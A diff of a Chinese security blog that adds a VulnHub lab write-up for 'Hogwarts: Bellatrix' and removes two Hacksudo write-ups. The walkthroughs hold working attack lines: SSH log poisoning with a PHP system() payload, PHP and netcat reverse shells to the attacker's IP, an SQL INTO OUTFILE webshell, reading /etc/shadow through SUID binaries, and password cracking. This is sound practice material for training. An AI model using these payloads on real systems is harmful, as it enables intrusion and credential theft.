+<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
+<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
+<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
+<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
+<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
+<p>4.可以登录到lestrange用户：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
+<p>2.直接写入，提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
 </blockquote>
 
 
@@ -800,212 +1012,6 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 <p><img src="/2022/08/03/Hacksudo-Search/18.png" alt="image-"></p>
 <p>4.在&#x2F;root目录下，可以找到flag，即root.txt:</p>
 <p><img src="/2022/08/03/Hacksudo-Search/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/Hacksudo-FOG/">
-                Hacksudo FOG
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hacksudofog">Hacksudo:FOG</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hacksudofog">名称：hacksudo:FOG</span></h4><h4><span id="发布日期2021514">发布日期：2021.5.14</span></h4><h4><span id="作者vishal-waghmare">作者：Vishal Waghmare</span></h4><h4><span id="系列hacksudo">系列：hacksudo</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>hacksudo:&#x2F;flag1.txt<br>www-data:&#x2F;var&#x2F;www&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hacksudo-fogzip">文件名：hacksudo-FOG.zip</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehacksudohacksudo-fogzip">下载地址：</span></h4><h4><span id="md5-fe8360e56637fe0d278ef2c38f15b969">MD5: FE8360E56637FE0D278EF2C38F15B969</span></h4><h4><span id="sha1-31b1210f45c74d3062a0edd5677c6bb770eb26af">SHA1: 31B1210F45C74D3062A0EDD5677C6BB770EB26AF</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机FOG和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，访问主页源码中隐藏了一个index1.html：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.112 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/4.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，index1.html提示我们一个音频文件提取工具：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.112/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/6.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/7.png" alt="image-"></p>
-</blockquote>
-<h3><span id="cms漏洞利用">CMS漏洞利用</span></h3><blockquote>
-<p>1.我们将提示的解析工具下载下来，尝试用工具解析index.html页的smoke.mp4，但不是wav格式没有信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/hacksudo/SoundStegno.git，获取工具</span><br><span class="line">cd SoundStegno</span><br><span class="line">wget http://192.168.56.112/smoke.mp4</span><br><span class="line">python3 ExWave.py -f smoke.mp4</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/8.png" alt="image-"></p>
-<p>2.通过之前的目录扫描，我们发现有cms页面和一个dict.txt文件：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/9.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/10.png" alt="image-"></p>
-<p>3.将dict.txt文件下载，很可能是密码字典，再去查询cms的漏洞，发现是2.2.5版本，有未经身份验证的SQL注入漏洞可以使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.112/dict.txt</span><br><span class="line">whatweb http://192.168.56.112/cms，查看框架版本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmadesimple-exploit.py -u http://192.168.56.112/cms，漏洞利用程序获取见：https://gist.github.com/kriss-u/321f0418778697e2ec919f04664ceb4b</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/12.png" alt="image-"></p>
-<p>4.知晓了用户名，写入user，可以尝试使用hydra爆破密码，登录FTP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user -P dict.txt 192.168.56.112 ftp</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/13.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ftp登录提取音频隐藏信息">FTP登录，提取音频隐藏信息</span></h3><blockquote>
-<p>1.可以使用hacksudo用户FTP登录，获取到第一个flag，即flag1.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/14.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/15.png" alt="image-"></p>
-<p>2.进入hacksudo_ISRO_bak目录，发现secr3tSteg.zip文件，需要密码，我们用zip2john配合john获得密码：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john secr3tSteg.zip &gt;&gt; hash.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/17.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/18.png" alt="image-"></p>
-<p>3.解压得到的hacksudoSTEGNO.wav可以使用SoundStegno进行解密：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ExWave.py -f hacksudoSTEGNO.wav</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/19.png" alt="image-"></p>
-<p>4.根据之前index1.html页源码的提示，需要用到caesar-cipher解密，我们解密这个数据可以得到一个用户名密码，这个用户与密码可用于登录cms后台：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/20.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/21.png" alt="image-"></p>
-</blockquote>
-<h3><span id="文件上传漏洞getshell">文件上传漏洞GETSHELL</span></h3><blockquote>
-<p>1.进入cms后台的content页，可以上传phtml文件后缀的webshell，这里我们使用kali自带的webshell进行修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/22.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/23.png" alt="image-"></p>
-<p>2.kali开启对应端口监听，触发webshell，利用python生成交互式shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/24.png" alt="image-"></p>
-<p>3.在&#x2F;var&#x2F;www目录下能发现第二个flag，即flag2.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/25.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权ssh登录">初步提权，SSH登录</span></h3><blockquote>
-<p>1.查看具有root权限的suid文件，尝试提权，发现&#x2F;usr&#x2F;bin&#x2F;look：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-FOG/26.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/27.png" alt="image-"></p>
-<p>2.通过在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E4%B8%8A%E6%9F%A5%E6%89%BE%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8look%E6%9F%A5%E7%9C%8B%E5%85%B7%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%99%E7%94%A8look%E6%9F%A5%E7%9C%8B/etc/shadow%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0root%E5%8F%8Aisro%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81hash%EF%BC%8C%E4%BD%BF%E7%94%A8john%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9A">https://gtfobins.github.io/上查找发现可以使用look查看具有root权限的文件，则用look查看/etc/shadow可以发现root及isro用户的密码hash，使用john解一下：</a></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/28.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/29.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/30.png" alt="image-"></p>
-<p>3.爆出isro用户密码为qwerty，可以进行ssh登录，然后在目录下查看到user.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/31.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.我们进入&#x2F;fog目录下，发现有一个fog文件属主为root，查看不出来，但是执行后与python2.7相关联，则可以通过python进行root提权：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/32.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-FOG/33.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下的root.txt即是我们需要的最后一个flag：</p>
-<p><img src="/2022/08/03/Hacksudo-FOG/34.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hacksudo/" rel="tag">Hacksudo</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/03/Hacksudo-Aliens/">
-                Hacksudo Aliens
-            </a>
-        </h2>
-    
-    <time>
-        Aug 3, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hacksudoaliens">Hacksudo:Aliens</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hacksudoaliens">名称：hacksudo:aliens</span></h4><h4><span id="发布日期202144">发布日期：2021.4.4</span></h4><h4><span id="作者vishal-waghmare">作者：Vishal Waghmare</span></h4><h4><span id="系列hacksudo">系列：hacksudo</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hacksudoalienszip">文件名：HacksudoAliens.zip</span></h4><h4><span id="文件大小23gb">文件大小：2.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehacksudohacksudoalienszip">下载地址：</span></h4><h4><span id="md5-defa809b70dadcc72011aafbb03d1ff6">MD5: DEFA809B70DADCC72011AAFBB03D1FF6</span></h4><h4><span id="sha1-6e68d6d06692d2c3acbc1e1c3aea271a226cd24d">SHA1: 6E68D6D06692D2C3ACBC1E1C3AEA271A226CD24D</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Aliens和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放22，80，9000端口，访问主页，源码内有没有过多提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.110 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/4.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，两个目录，访问&#x2F;backup目录，下面mysql.bak文件内有用户和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.110/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/6.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/7.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/8.png" alt="image-"></p>
-</blockquote>
-<h3><span id="登录phpadmin写入shell">登录phpadmin，写入shell</span></h3><blockquote>
-<p>1.因为端口扫描到了9000端口是phpadmin的服务，利用刚才mysql.bak内的账号密码可成功登录：</p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/9.png" alt="image-"></p>
-<p>2.可以查看secure_file_priv的值为空，mysql可读可写，可以先用一句话php木马尝试，这里直接写入shell，在kali同步开启监听：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT “&lt;?php system($_GET[‘cmd’]);?&gt;” INTO OUTFILE “/var/www/html/alien.php”，一句话木马</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/alien.php?cmd=nc%20192.168.56.102%20%208989%20%20-e%20/bin/bash，浏览器输入payload，kali同步开启8989端口监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root权限文件查询准备提权">root权限文件查询，准备提权</span></h3><blockquote>
-<p>1.查找具有root权限的suid文件，进行suid提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/13.png" alt="image-"></p>
-<p>2.访问<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%EF%BC%8C%E5%AF%B9%E6%9F%A5%E5%88%B0%E7%9A%84%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E6%AF%94%E5%AF%B9%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83%EF%BC%9A">https://gtfobins.github.io/，对查到的内容进行比对尝试提权：</a></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/14.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LFILE=/etc/shadow</span><br><span class="line">date -f $LFILE</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/03/Hacksudo-Aliens/15.png" alt="image-"></p>
-<p>3.很明显得到的数据是hacksudo及其密码，将字符串拷贝到alien.txt，我们利用john对其解密：</p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.进入hacksudo用户，再次查看具有root权限的suid文件，尝试提权：</p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/17.png" alt="image-"></p>
-<p>2.查询到cpulimit文件，再去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E6%9F%A5%E8%AF%A2%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%EF%BC%9A">https://gtfobins.github.io/查询提权方式：</a></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/18.png" alt="image-"></p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/19.png" alt="image-"></p>
-<p>3.成功登录root用户，在&#x2F;root目录下发现flag，root.txt：</p>
-<p><img src="/2022/08/03/Hacksudo-Aliens/20.png" alt="image-"></p>
 </blockquote>
 
 
